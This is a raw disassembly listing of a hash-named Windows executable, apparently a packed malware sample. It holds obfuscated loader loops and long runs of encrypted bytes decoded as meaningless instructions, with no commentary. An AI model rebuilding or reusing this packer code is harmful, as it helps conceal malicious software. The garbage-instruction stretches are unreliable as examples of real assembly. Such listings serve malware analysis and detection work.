
9dfb96da8a53b8da88099d1553aedb5b03d87e67ea1e14f32f824de20f1e647e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x42a9d5
  40100c:	jmp    0x4012ab
  401011:	(bad)  
  401012:	into   
  401013:	(bad)  
  401014:	rcr    edx,cl
  401016:	(bad)  
  401018:	aad    0xdf
  40101a:	mov    ebx,0x539b0cf7
  40101f:	cld    
  401020:	ins    BYTE PTR es:[edi],dx
  401021:	js     0x40109b
  401023:	js     0x40109d
  401025:	(bad)  
  401026:	jle    0x4010a0
  401028:	js     0x400ff2
  40102a:	xlat   BYTE PTR ds:[ebx]
  40102b:	cmp    eax,0xcfdbc1d5
  401030:	fld    st(6)
  401032:	pop    es
  401033:	push   es
  401034:	or     eax,DWORD PTR ds:0x3b080a79
  40103a:	bswap  edx
  40103c:	and    al,bh
  40103e:	sbb    bl,BYTE PTR [edi]
  401040:	inc    ecx
  401041:	bound  ecx,QWORD PTR [edx]
  401043:	mov    bh,0xdd
  401045:	or     bh,ch
  401047:	mov    ebp,0x880bd0e3
  40104c:	and    BYTE PTR [eax+0x1549a4f6],bh
  401052:	lods   eax,DWORD PTR ds:[esi]
  401053:	fadd   DWORD PTR [eax+0x1f]
  401056:	pusha  
  401057:	out    dx,al
  401058:	outs   dx,DWORD PTR ds:[esi]
  401059:	adc    ebx,DWORD PTR [ecx]
  40105b:	sahf   
  40105c:	add    dl,al
  40105e:	dec    edx
  40105f:	lods   al,BYTE PTR ds:[esi]
  401060:	pop    ebx
  401061:	sub    eax,0xad3ec6d9
  401066:	mov    WORD PTR [ebx],es
  401068:	lds    esi,FWORD PTR [ebx-0x76243a00]
  40106e:	adc    eax,0x3af3c19a
  401074:	xchg   ebx,eax
  401075:	icebp  
  401076:	dec    edi
  401077:	loopne 0x401019
  401079:	dec    ecx
  40107a:	call   DWORD PTR [edi-0x234ef85e]
  401080:	mov    ebp,0x5530ed4d
  401085:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  40108c:	sbb    ebx,ecx
  40108e:	xchg   esp,eax
  40108f:	sub    esi,edx
  401091:	repz pop eax
  401093:	(bad)  
  401094:	out    0x42,al
  401096:	cli    
  401097:	in     al,dx
  401098:	xchg   esp,eax
  401099:	cmp    edi,ecx
  40109b:	jbe    0x401102
  40109d:	xlat   BYTE PTR ds:[ebx]
  40109e:	sub    cl,ch
  4010a0:	add    al,0xe1
  4010a2:	sbb    DWORD PTR [ecx-0x60],ebx
  4010a5:	xor    eax,0x2696f0b
  4010aa:	adc    bh,BYTE PTR [ecx]
  4010ac:	fisttp QWORD PTR [eax+0x7f753256]
  4010b2:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010b8:	arpl   WORD PTR [ebp-0x23],dx
  4010bb:	rcl    BYTE PTR [ecx],1
  4010bd:	fistp  DWORD PTR [esi-0x1f]
  4010c0:	and    DWORD PTR [ecx-0x68],edi
  4010c3:	inc    eax
  4010c4:	push   ebx
  4010c5:	aaa    
  4010c6:	adc    eax,0x1c317733
  4010cb:	fstp   TBYTE PTR [eax]
  4010cd:	dec    edi
  4010ce:	repnz int 0xa6
  4010d1:	stos   DWORD PTR es:[edi],eax
  4010d2:	jmp    0x3cc9:0xc5df22a7
  4010d9:	cld    
  4010da:	sub    bh,bh
  4010dc:	xor    BYTE PTR ds:0x1a7450d2,0xd1
  4010e3:	outs   dx,DWORD PTR ds:[esi]
  4010e4:	add    bh,BYTE PTR [ecx+esi*1]
  4010e7:	xor    edi,DWORD PTR [edi+0x2d]
  4010ea:	les    edx,FWORD PTR [ebx+0x333f026d]
  4010f0:	jmp    0xf353:0x1763259f
  4010f7:	pop    ss
  4010f8:	jp     0x401105
  4010fa:	push   edx
  4010fb:	popa   
  4010fc:	fnsave [edx]
  4010fe:	int3   
  4010ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401100:	mov    WORD PTR [eiz*2-0x9c43dd0],?
  401107:	stos   BYTE PTR es:[edi],al
  401108:	or     al,0xf5
  40110a:	stos   DWORD PTR es:[edi],eax
  40110b:	pop    edx
  40110c:	das    
  40110d:	dec    esp
  40110e:	sub    ch,al
  401110:	loopne 0x4010b8
  401112:	inc    edi
  401113:	jmp    0x491:0xe7595b61
  40111a:	out    dx,al
  40111b:	xchg   BYTE PTR [eax-0x36d0fef0],cl
  401121:	jnp    0x401124
  401123:	pop    edx
  401124:	jbe    0x401133
  401126:	mov    esp,0xc4388c22
  40112b:	and    eax,0x6953a3dc
  401130:	xchg   esp,eax
  401131:	(bad)  
  401132:	daa    
  401133:	pop    ebp
  401134:	push   ds
  401135:	push   esp
  401136:	sub    DWORD PTR [eax+0x52],ebp
  401139:	and    eax,0x144f499e
  40113e:	jns    0x4010d0
  401140:	outs   dx,DWORD PTR ds:[esi]
  401141:	ins    BYTE PTR es:[edi],dx
  401142:	cs fcmovb st,st(7)
  401145:	in     al,0x75
  401147:	push   ds
  401148:	fstp   DWORD PTR [edi]
  40114a:	lea    eax,[edi-0x2d838735]
  401150:	xor    al,0x78
  401152:	xchg   dl,dl
  401154:	mov    bl,0xe0
  401156:	pop    edx
  401157:	aas    
  401158:	xor    DWORD PTR [edx+0x302c4ff3],edx
  40115e:	in     al,dx
  40115f:	out    0x94,eax
  401161:	mov    bl,dh
  401163:	xor    ch,dl
  401165:	pop    ebp
  401166:	xor    eax,0x59733807
  40116b:	mov    al,ds:0xcd58a7dd
  401170:	mov    DWORD PTR [ecx-0x69],edi
  401173:	xor    bh,0xc3
  401176:	jg     0x401177
  401178:	mov    edi,fs
  40117a:	sbb    BYTE PTR [ebx-0x6bd224e8],ah
  401180:	les    edi,FWORD PTR [edi+0x7b8ae74e]
  401186:	arpl   WORD PTR ds:0x35844fb,sp
  40118c:	nop
  40118d:	in     eax,dx
  40118e:	fstp   st(2)
  401190:	inc    esp
  401191:	enter  0x62a8,0xe1
  401195:	std    
  401196:	repnz mov dh,BYTE PTR [edx]
  401199:	dec    edi
  40119a:	jns    0x401190
  40119c:	add    al,bh
  40119e:	push   esi
  40119f:	fnstcw WORD PTR [edi-0x2faf57e3]
  4011a5:	retf   0xf0e8
  4011a8:	data16 ja 0x40121f
  4011ab:	dec    esp
  4011ac:	(bad)  [esi+0x48b6c723]
  4011b2:	(bad)  
  4011b3:	mov    edx,DWORD PTR [eax]
  4011b5:	push   0xffffffb1
  4011b7:	lock and al,0x35
  4011ba:	push   ebx
  4011bb:	stos   BYTE PTR es:[edi],al
  4011bc:	js     0x40114f
  4011be:	jl     0x4011e6
  4011c0:	addr16 or ebp,edi
  4011c3:	jns    0x4011c1
  4011c5:	(bad)  
  4011c6:	(bad)  
  4011c7:	cmp    eax,0x239292ac
  4011cc:	mov    esi,0xc201d36c
  4011d1:	push   edx
  4011d2:	popa   
  4011d3:	fnsave [esi-0x2c97b8bb]
  4011d9:	and    DWORD PTR [edx-0x2df930ad],0x25
  4011e0:	cmp    eax,0x4feef0dd
  4011e5:	fs es mov edi,0x4e816c3
  4011ec:	and    eax,0x4f9b76ad
  4011f1:	sbb    BYTE PTR [edx+eax*8-0x12],ch
  4011f5:	pop    ebp
  4011f6:	mov    bl,0xf8
  4011f8:	fdiv   st(7),st
  4011fa:	pop    ss
  4011fb:	or     ch,BYTE PTR [edx-0x52984cb7]
  401201:	add    DWORD PTR [edi],0x5fdccf48
  401207:	daa    
  401208:	sti    
  401209:	mov    DWORD PTR [esi],ecx
  40120b:	in     al,dx
  40120c:	dec    ecx
  40120d:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40120f:	fmul   QWORD PTR [edi+0x68]
  401212:	sbb    DWORD PTR [ecx-0x4d9f3f1d],0xad4baab3
  40121c:	mov    al,0x71
  40121e:	div    bl
  401220:	adc    cl,al
  401222:	or     eax,0x425be619
  401227:	adc    BYTE PTR [edx+edx*4-0x648f73fc],dh
  40122e:	outs   dx,DWORD PTR ds:[esi]
  40122f:	jl     0x4011f8
  401231:	jle    0x4012a6
  401233:	test   al,0x31
  401235:	add    al,0x60
  401237:	cmp    eax,DWORD PTR [esi+0x653658c4]
  40123d:	and    DWORD PTR [edx+0x6a98eef8],ebp
  401243:	out    dx,al
  401244:	jge    0x401250
  401246:	imul   ecx,DWORD PTR [ebp+ebp*2+0x2f],0xf
  40124b:	enter  0xec87,0x8d
  40124f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401250:	sub    al,BYTE PTR [ebx+0x3a09767f]
  401256:	cs inc esi
  401258:	rcr    DWORD PTR [edx],1
  40125a:	mov    BYTE PTR [eax-0x79],dh
  40125d:	xor    BYTE PTR [esi],bh
  40125f:	lods   eax,DWORD PTR ds:[esi]
  401260:	cmc    
  401261:	adc    al,0x62
  401263:	sbb    esi,DWORD PTR [ebx+ebp*2-0x3c]
  401267:	mov    al,ds:0x846aa513
  40126c:	or     al,0xe1
  40126e:	imul   edx,DWORD PTR [eax+0x5ed248d2],0x4a
  401275:	jp     0x401264
  401277:	adc    al,0x40
  401279:	adc    esi,DWORD PTR [eax]
  40127b:	daa    
  40127c:	push   ss
  40127d:	clc    
  40127e:	scas   eax,DWORD PTR es:[edi]
  40127f:	outs   dx,BYTE PTR ds:[esi]
  401280:	aam    0x4
  401282:	adc    eax,0x5546878b
  401287:	dec    edi
  401288:	xlat   BYTE PTR ds:[ebx]
  401289:	jmp    0x4012a4
  40128b:	push   ss
  40128c:	test   DWORD PTR [ecx+0x4e443b3f],edi
  401292:	jp     0x401247
  401294:	push   0xfffffff3
  401296:	icebp  
  401297:	cwde   
  401298:	sub    ebx,edx
  40129a:	jbe    0x4012c6
  40129c:	repz ficom DWORD PTR [esi+ecx*2-0x32]
  4012a1:	call   0x164bd988
  4012a6:	fwait
  4012a7:	jl     0x4012c8
  4012a9:	(bad)  
  4012aa:	ins    DWORD PTR es:[edi],dx
  4012ab:	mov    eax,ds:0x41eae6
  4012b0:	xor    DWORD PTR ds:0x42aa6d,edx
  4012b6:	mov    eax,DWORD PTR [eax+0x198]
  4012bc:	mov    ecx,DWORD PTR ds:0x42aa21
  4012c2:	or     DWORD PTR ds:0x42a9cd,ecx
  4012c8:	mov    DWORD PTR [ebp-0x8],eax
  4012cb:	mov    DWORD PTR ds:0x42a9bd,0x436b
  4012d5:	mov    eax,DWORD PTR [ebp+0x8]
  4012d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4012db:	push   ebx
  4012dc:	or     DWORD PTR ds:0x42aa21,edx
  4012e2:	push   esi
  4012e3:	add    esi,DWORD PTR ds:0x42aa15
  4012e9:	mov    esi,0x7510850
  4012ee:	and    ebx,0x1c58
  4012f4:	xor    eax,esi
  4012f6:	and    DWORD PTR ds:0x42aa99,0x0
  401300:	jmp    0x401312
  401305:	mov    ebx,DWORD PTR ds:0x42aa99
  40130b:	inc    ebx
  40130c:	mov    DWORD PTR ds:0x42aa99,ebx
  401312:	cmp    DWORD PTR ds:0x42aa99,0x11
  401319:	jae    0x401344
  40131f:	cmp    DWORD PTR ds:0x42aa99,0x16
  401326:	jne    0x401335
  40132c:	push   DWORD PTR [ebp-0x1c]
  40132f:	call   DWORD PTR ds:0x41d180
  401335:	jmp    0x401305
  40133a:	adc    DWORD PTR ds:0x42a9e1,0x42aa65
  401344:	push   edi
  401345:	and    DWORD PTR ds:0x42aa69,0x0
  40134f:	jmp    0x401361
  401354:	mov    edi,DWORD PTR ds:0x42aa69
  40135a:	inc    edi
  40135b:	mov    DWORD PTR ds:0x42aa69,edi
  401361:	cmp    DWORD PTR ds:0x42aa69,0x1d
  401368:	jae    0x4013a9
  40136e:	cmp    DWORD PTR ds:0x42aa69,0xe
  401375:	jne    0x401384
  40137b:	push   DWORD PTR [ebp-0x10]
  40137e:	call   DWORD PTR ds:0x41d0b4
  401384:	cmp    DWORD PTR ds:0x42aa69,0xd
  40138b:	jne    0x40139e
  401391:	mov    edi,DWORD PTR ds:0x42aa69
  401397:	inc    edi
  401398:	mov    DWORD PTR ds:0x42aa69,edi
  40139e:	jmp    0x401354
  4013a3:	sub    DWORD PTR ds:0x42aa15,edx
  4013a9:	mov    edi,0x327298
  4013ae:	mov    DWORD PTR ds:0x42a9cd,0x11
  4013b8:	cmp    DWORD PTR ds:0x42a9cd,0x0
  4013bf:	je     0x4016af
  4013c5:	cmp    DWORD PTR ds:0x42a9cd,0x2
  4013cc:	jne    0x4013e4
  4013d2:	push   0x42aa15
  4013d7:	push   0x0
  4013d9:	push   0x42ac2d
  4013de:	call   DWORD PTR ds:0x41d0b8
  4013e4:	cmp    DWORD PTR ds:0x42a9cd,0x3
  4013eb:	jne    0x4013fe
  4013f1:	mov    ebx,DWORD PTR ds:0x42a9cd
  4013f7:	dec    ebx
  4013f8:	mov    DWORD PTR ds:0x42a9cd,ebx
  4013fe:	mov    ebx,DWORD PTR ds:0x42a9cd
  401404:	dec    ebx
  401405:	mov    DWORD PTR ds:0x42a9cd,ebx
  40140b:	jmp    0x4013b8
  401410:	jmp    0x4016af
  401415:	leave  
  401416:	rol    dh,0xcf
  401419:	leave  
  40141a:	int    0xd9
  40141c:	fimul  DWORD PTR [edx]
  40141e:	leave  
  40141f:	rcl    BYTE PTR [ecx-0x45],1
  401422:	je     0x401413
  401424:	xor    esi,edi
  401426:	jle    0x4014a0
  401428:	js     0x401428
  40142a:	jle    0x4014a4
  40142c:	js     0x40143f
  40142e:	sbb    eax,0x8f093c47
  401433:	fistp  WORD PTR [eax]
  401435:	leave  
  401436:	pop    es
  401437:	int    0xdf
  401439:	add    DWORD PTR [ecx+ebp*1],ebx
  40143c:	out    0xa4,al
  40143e:	inc    edx
  40143f:	cmp    edi,DWORD PTR [edi+0x26]
  401442:	es cs call 0xc82f5471
  401449:	repz xchg ebp,eax
  40144b:	sbb    BYTE PTR ds:[eax],ah
  40144e:	or     esi,esp
  401450:	dec    edx
  401451:	repnz repnz or eax,0x308774fd
  401458:	mov    cl,0x5c
  40145a:	xor    ebp,edx
  40145c:	es cld 
  40145e:	ins    DWORD PTR es:[edi],dx
  40145f:	and    eax,DWORD PTR [eax-0x4065b1a]
  401465:	jle    0x4014a2
  401467:	jg     0x4013f0
  401469:	pop    ss
  40146a:	add    DWORD PTR [ebp-0x26],esi
  40146d:	(bad)  
  40146e:	(bad)  [ebx]
  401470:	call   0x10bb:0xf6edf3d9
  401477:	sbb    al,0x61
  401479:	add    BYTE PTR [ecx+0x181334ea],bl
  40147f:	inc    edx
  401480:	push   ecx
  401481:	shl    DWORD PTR [esi+esi*8-0x619e0f15],1
  401488:	jge    0x4014cf
  40148a:	(bad)  
  40148c:	sbb    bl,BYTE PTR [ecx+ebx*4+0x6d55b3e4]
  401493:	or     BYTE PTR [edi],ch
  401495:	and    BYTE PTR [esi+edi*8-0x54060feb],ch
  40149c:	cmp    eax,0xd59ad339
  4014a1:	jo     0x401507
  4014a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014a4:	stos   DWORD PTR es:[edi],eax
  4014a5:	jne    0x4014a2
  4014a7:	stos   BYTE PTR es:[edi],al
  4014a8:	popa   
  4014a9:	cwde   
  4014aa:	and    al,0xfe
  4014ac:	xor    DWORD PTR [esi-0x43],eax
  4014af:	(bad)  
  4014b0:	push   edi
  4014b1:	rol    esp,1
  4014b3:	mov    dl,0x2e
  4014b5:	sub    al,0xa6
  4014b7:	icebp  
  4014b8:	cmp    BYTE PTR [ecx+0x7],dh
  4014bb:	bound  eax,QWORD PTR [eax+0x4d]
  4014be:	mov    ch,0x75
  4014c0:	sahf   
  4014c1:	or     al,BYTE PTR [eax-0x13]
  4014c4:	xor    esi,DWORD PTR [edx+0x6e33d7d6]
  4014ca:	sahf   
  4014cb:	data16 icebp 
  4014cd:	xor    BYTE PTR [ebp+0x2e],dl
  4014d0:	jmp    0x2493ab91
  4014d5:	cmc    
  4014d6:	daa    
  4014d7:	mov    edx,0x18255353
  4014dc:	xchg   ecx,eax
  4014dd:	xchg   ecx,eax
  4014de:	rcl    BYTE PTR [esi+eax*8-0x739a16c0],0xaa
  4014e6:	jo     0x40153c
  4014e8:	push   esi
  4014e9:	add    ebp,DWORD PTR [ebx-0x58badcd0]
  4014ef:	adc    eax,0x82a7ba7c
  4014f4:	xor    DWORD PTR [ecx],esp
  4014f6:	fcomp  DWORD PTR [ebx-0x5a]
  4014f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4014fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014fb:	adc    dh,dh
  4014fd:	push   ds
  4014fe:	push   ss
  4014ff:	cmp    edi,ebp
  401501:	xor    al,0xe6
  401503:	pop    eax
  401504:	(bad)
  401507:	mov    WORD PTR [ebx+0x18],ds
  40150a:	cmp    eax,0x23ee2ad1
  40150f:	inc    esp
  401510:	ins    BYTE PTR es:[edi],dx
  401511:	jecxz  0x4014eb
  401513:	cs leave 
  401515:	(bad)  
  401516:	push   edx
  401517:	pop    eax
  401518:	into   
  401519:	sub    DWORD PTR [esi+edx*4],ebp
  40151c:	inc    esi
  40151d:	xlat   BYTE PTR ds:[ebx]
  40151e:	arpl   WORD PTR [ebx+edi*8-0x3],sp
  401522:	fistp  WORD PTR [esi]
  401524:	xchg   ebx,eax
  401525:	aad    0x55
  401527:	loope  0x401517
  401529:	fcom   QWORD PTR [eax]
  40152b:	mov    dl,0xea
  40152d:	mov    ecx,0x8ab40643
  401532:	add    dl,dl
  401534:	cs mov esp,0x4db2f1df
  40153a:	pop    ss
  40153b:	push   ss
  40153c:	fimul  WORD PTR [eax+0x14346adc]
  401542:	inc    edi
  401543:	mov    edx,0x7dce6975
  401548:	test   eax,0xa8441fb7
  40154d:	ds in  al,dx
  40154f:	lods   al,BYTE PTR ds:[esi]
  401550:	jmp    0x56d8:0x76ed3148
  401557:	lods   eax,DWORD PTR ds:[esi]
  401558:	fmul   QWORD PTR [edx+0x1b60effe]
  40155e:	dec    ebp
  40155f:	or     edx,DWORD PTR [ebx+0x428a28b9]
  401565:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401566:	inc    esi
  401567:	popf   
  401568:	add    ebp,0xffffffcb
  40156b:	jmp    0x401534
  40156d:	add    ebx,DWORD PTR [edi]
  40156f:	pop    es
  401570:	mov    ebx,edi
  401572:	out    dx,eax
  401573:	xchg   edi,eax
  401574:	out    dx,eax
  401575:	mov    bh,0x15
  401577:	stos   DWORD PTR es:[edi],eax
  401578:	push   es
  401579:	out    0x76,eax
  40157b:	les    ecx,FWORD PTR [ebx+0x6a]
  40157e:	out    dx,eax
  40157f:	pop    ss
  401580:	push   edx
  401581:	adc    eax,0x137ff442
  401586:	daa    
  401587:	xchg   ebp,eax
  401588:	push   0xffffffde
  40158a:	daa    
  40158b:	rcr    BYTE PTR ds:0x4d28ce24,0x44
  401592:	rcl    BYTE PTR [eax],1
  401594:	push   esp
  401595:	xor    al,0x5f
  401597:	dec    eax
  401598:	add    al,0xaf
  40159a:	xor    al,bh
  40159c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40159d:	nop
  40159e:	pop    edx
  40159f:	pop    ecx
  4015a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4015a1:	(bad)  
  4015a3:	fchs   
  4015a5:	jge    0x401552
  4015a7:	fild   QWORD PTR [edx]
  4015a9:	jo     0x40157b
  4015ab:	stc    
  4015ac:	imul   ebp,esp,0xffffff99
  4015af:	inc    edi
  4015b0:	push   ss
  4015b1:	add    bh,cl
  4015b3:	jge    0x4015e3
  4015b5:	int3   
  4015b6:	lods   eax,DWORD PTR gs:[esi]
  4015b8:	inc    edx
  4015b9:	push   ds
  4015ba:	inc    esi
  4015bb:	mov    WORD PTR [edx+0x187c705a],ds
  4015c1:	xchg   ebx,eax
  4015c2:	lods   al,BYTE PTR ds:[esi]
  4015c3:	es pop ds
  4015c5:	pop    ds
  4015c6:	xor    BYTE PTR [edx+0x1b],0x10
  4015ca:	mov    ecx,0xb78e998b
  4015cf:	rcl    DWORD PTR [esi+0x4de9a142],0xec
  4015d6:	xor    esi,DWORD PTR [eax+eax*8]
  4015d9:	lds    eax,FWORD PTR [ecx+0x6f]
  4015dc:	mov    bl,0xe3
  4015de:	outs   dx,DWORD PTR ds:[esi]
  4015df:	xor    ebp,DWORD PTR [ebp+0x5d]
  4015e2:	(bad)  
  4015e3:	pop    edi
  4015e4:	sub    ah,BYTE PTR [esi]
  4015e6:	and    eax,0x91086215
  4015eb:	sti    
  4015ec:	jge    0x4015bb
  4015ee:	loop   0x401598
  4015f0:	cdq    
  4015f1:	in     eax,dx
  4015f2:	ret    
  4015f3:	pop    edx
  4015f4:	ins    DWORD PTR es:[edi],dx
  4015f5:	adc    al,0x18
  4015f7:	mov    bl,0x67
  4015f9:	dec    ecx
  4015fa:	xor    BYTE PTR [edx+ebp*8],dl
  4015fd:	stc    
  4015fe:	mov    al,ds:0x5b138c9
  401603:	add    edx,esp
  401605:	pop    ebp
  401606:	mov    ?,WORD PTR [edi+ebx*4+0x31]
  40160a:	mov    esp,0xf9135800
  40160f:	add    al,0xe4
  401611:	xchg   esi,eax
  401612:	sbb    ah,BYTE PTR [edi+0x736138ba]
  401618:	inc    esp
  401619:	jp     0x4015cf
  40161b:	dec    ebx
  40161c:	icebp  
  40161d:	(bad)  
  40161e:	adc    edx,DWORD PTR [ecx]
  401620:	mov    al,dl
  401622:	test   ebx,esi
  401624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401625:	push   0x55
  401627:	xor    ebp,0xb1642c88
  40162d:	inc    edx
  40162e:	iret   
  40162f:	mov    al,0x6b
  401631:	or     dl,ch
  401633:	loope  0x401667
  401635:	sub    DWORD PTR [ebx+0x38],eax
  401638:	adc    edx,edi
  40163a:	ret    0x89b4
  40163d:	dec    ebx
  40163e:	dec    eax
  40163f:	out    0xa1,eax
  401641:	call   0xf42d:0x14c63ee2
  401648:	adc    BYTE PTR ds:0x99d3e99a,ch
  40164e:	int    0xdd
  401650:	sub    DWORD PTR ds:[eax-0x18],0xfd484674
  401658:	test   BYTE PTR [ebp-0x30],cl
  40165b:	in     eax,0x9
  40165d:	call   0x5c2b3bc1
  401662:	mov    dh,0x10
  401664:	pop    ebx
  401665:	(bad)  
  401666:	mov    bh,0x7e
  401668:	xchg   ebx,eax
  401669:	push   eax
  40166a:	pop    ebp
  40166b:	mov    ds:0x5656a64f,al
  401670:	lahf   
  401671:	bound  ecx,QWORD PTR [ecx-0x43]
  401674:	and    bl,bh
  401676:	sbb    al,0x94
  401678:	add    edx,DWORD PTR [eax+ebx*8-0x50092111]
  40167f:	shl    dl,cl
  401681:	repnz pop ss
  401683:	inc    ebp
  401684:	jg     0x401648
  401686:	pop    es
  401687:	cs dec edx
  401689:	xor    ebp,DWORD PTR [ecx-0xc]
  40168c:	xchg   BYTE PTR ds:0x4090134a,ah
  401692:	xor    eax,0xcae3f6a4
  401697:	in     eax,0xab
  401699:	out    0xcf,eax
  40169b:	push   dx
  40169d:	into   
  40169e:	push   edx
  40169f:	stos   DWORD PTR es:[edi],eax
  4016a0:	or     al,0xc7
  4016a2:	sbb    al,BYTE PTR [edx+eiz*4+0x3f256a54]
  4016a9:	cmp    ebx,eax
  4016ab:	or     DWORD PTR [ecx-0x38fc9956],0xffffff81
  4016b2:	xor    eax,0x42aaad
  4016b7:	fcom   QWORD PTR [ebx+0x0]
  4016ba:	add    BYTE PTR [ecx+0x193d1101],cl
  4016c0:	stos   BYTE PTR es:[edi],al
  4016c1:	inc    edx
  4016c2:	add    BYTE PTR [ebp+0xd81fc45],cl
  4016c8:	leave  
  4016c9:	test   eax,0xa9bd0042
  4016ce:	inc    edx
  4016cf:	add    BYTE PTR [ecx+0x1d31f045],cl
  4016d5:	int    0xa9
  4016d7:	inc    edx
  4016d8:	add    BYTE PTR [ebx-0x2608f7bb],cl
  4016de:	mov    ecx,DWORD PTR [ebp-0x10]
  4016e1:	xor    eax,esi
  4016e3:	jmp    0x401982
  4016e8:	ret    0x3dc5
  4016eb:	ret    
  4016ec:	leave  
  4016ed:	retf   
  4016ee:	ret    0xebc5
  4016f1:	out    0x4b,eax
  4016f3:	repz jecxz 0x401687
  4016f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016f7:	and    al,0x7c
  4016f9:	add    edi,DWORD PTR [eax+0x78]
  4016fc:	(bad)  
  4016fd:	jle    0x401777
  4016ff:	js     0x401721
  401701:	hlt    
  401702:	and    eax,0x4baeb961
  401707:	pusha  
  401708:	ficomp DWORD PTR [edx+0x71]
  40170b:	mov    ah,0xa6
  40170d:	sub    al,0xf5
  40170f:	jb     0x40172a
  401711:	push   ds
  401712:	iret   
  401713:	dec    ecx
  401714:	xchg   esp,eax
  401715:	push   ebp
  401716:	xor    BYTE PTR [ecx],0xeb
  401719:	test   eax,0x95f9221
  40171e:	sbb    ah,cl
  401720:	ret    
  401721:	cmp    edx,DWORD PTR [ebp-0x2]
  401724:	mov    DWORD PTR [edi+0x66],esi
  401727:	cmp    DWORD PTR [eax-0x2acf930a],ecx
  40172d:	das    
  40172e:	jb     0x40170a
  401730:	int    0xef
  401732:	es cli 
  401734:	shl    BYTE PTR [ecx-0x3bdf9f2],1
  40173a:	or     eax,0x27eaac0e
  40173f:	test   eax,0xe54987ce
  401744:	mov    ebp,ecx
  401746:	shr    BYTE PTR [ecx+0x1388db38],0x69
  40174d:	imul   BYTE PTR [ecx-0x16]
  401750:	mov    ds:0xf31c7d06,al
  401755:	xor    edi,edx
  401757:	aam    0x5f
  401759:	ins    DWORD PTR es:[edi],dx
  40175a:	call   0x6bc7:0xea276c08
  401761:	repz enter 0x77c4,0x85
  401766:	int    0x6d
  401768:	pop    esp
  401769:	sub    dh,BYTE PTR [ebx-0x170d5593]
  40176f:	popa   
  401770:	hlt    
  401771:	mov    edx,0x746cccc9
  401776:	or     edi,edx
  401778:	imul   esi,DWORD PTR [edx-0xf6cd38d],0xfffffff6
  40177f:	clc    
  401780:	jo     0x40174e
  401782:	out    0xd0,al
  401784:	jmp    0x401786
  401786:	out    0x48,eax
  401788:	mov    ebp,fs
  40178a:	mov    cl,0x48
  40178c:	pop    ds
  40178d:	and    DWORD PTR [edx+0x6d],ecx
  401790:	mov    DWORD PTR [eax-0x2d],ebp
  401793:	push   esp
  401794:	loope  0x401760
  401796:	or     BYTE PTR [edi+0x62ac68b2],bl
  40179c:	std    
  40179d:	push   cs
  40179e:	clc    
  40179f:	inc    esp
  4017a0:	cmp    BYTE PTR [edi+0x14],ch
  4017a3:	shl    cl,0x94
  4017a6:	pop    ecx
  4017a7:	jns    0x40174a
  4017a9:	test   BYTE PTR [ebx],al
  4017ab:	cld    
  4017ac:	popf   
  4017ad:	jle    0x4017c9
  4017af:	adc    eax,0x3c04cd37
  4017b4:	fdivrp st(3),st
  4017b6:	pushf  
  4017b7:	xor    al,BYTE PTR [esi-0x4e]
  4017ba:	mov    ebp,0x711b6c6d
  4017bf:	clc    
  4017c0:	mov    dl,0x27
  4017c2:	sub    eax,0xd4588577
  4017c7:	adc    BYTE PTR [edx+0x235bdfc4],0x2a
  4017ce:	pop    eax
  4017cf:	rol    BYTE PTR [ecx-0x652ab294],1
  4017d5:	adc    BYTE PTR [eax+0x0],al
  4017d8:	stos   BYTE PTR es:[edi],al
  4017d9:	mov    ds:0xd6f0f93,al
  4017de:	data16 (bad) [eax]
  4017e1:	jp     0x4017c3
  4017e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017e4:	xchg   edx,eax
  4017e5:	(bad)  [eax]
  4017e7:	test   eax,0xd2ae2454
  4017ec:	jp     0x4017b3
  4017ee:	cwde   
  4017ef:	push   ss
  4017f0:	in     eax,dx
  4017f1:	push   ss
  4017f2:	adc    edx,DWORD PTR [eax+0x4c]
  4017f5:	pop    edi
  4017f6:	(bad)  
  4017f8:	xor    DWORD PTR [eax+eax*4+0x64],eax
  4017fc:	xor    DWORD PTR [edx+0x7f],ebp
  4017ff:	push   es
  401800:	les    eax,FWORD PTR [ebp-0x13]
  401803:	dec    eax
  401804:	sub    DWORD PTR [ebx],esp
  401806:	aad    0x2d
  401808:	dec    edi
  401809:	dec    ebp
  40180a:	lahf   
  40180b:	adc    al,0x37
  40180d:	sahf   
  40180e:	mov    ds:0x53b138e3,eax
  401813:	add    ah,dl
  401815:	and    al,0x60
  401817:	loopne 0x40179e
  401819:	lahf   
  40181a:	sti    
  40181b:	in     al,dx
  40181c:	add    ebx,ebx
  40181e:	pop    esp
  40181f:	loope  0x40187d
  401821:	out    0xbd,eax
  401823:	inc    eax
  401824:	cmp    esi,eax
  401826:	int    0xde
  401828:	loope  0x40182a
  40182a:	xchg   esp,eax
  40182b:	cmp    ebx,ebp
  40182d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40182e:	ror    esp,0xe5
  401831:	cmp    ah,BYTE PTR [eax]
  401833:	xor    BYTE PTR ds:0x49dc579e,bl
  401839:	mov    ds:0xa0ae2e7f,al
  40183e:	stos   BYTE PTR es:[edi],al
  40183f:	icebp  
  401840:	push   cs
  401841:	push   edx
  401842:	xor    BYTE PTR [ecx+0x45e69ec7],cl
  401848:	jge    0x4018b3
  40184a:	mov    bl,0xd2
  40184c:	or     DWORD PTR [ebx-0x7e163e1f],0x50
  401853:	mov    esp,0xfeb45923
  401858:	mov    bh,0xc4
  40185a:	xchg   edx,eax
  40185b:	jle    0x40187c
  40185d:	das    
  40185e:	lods   al,BYTE PTR ds:[esi]
  40185f:	xor    eax,0xf1047396
  401864:	inc    ebx
  401865:	xchg   edx,eax
  401866:	dec    edx
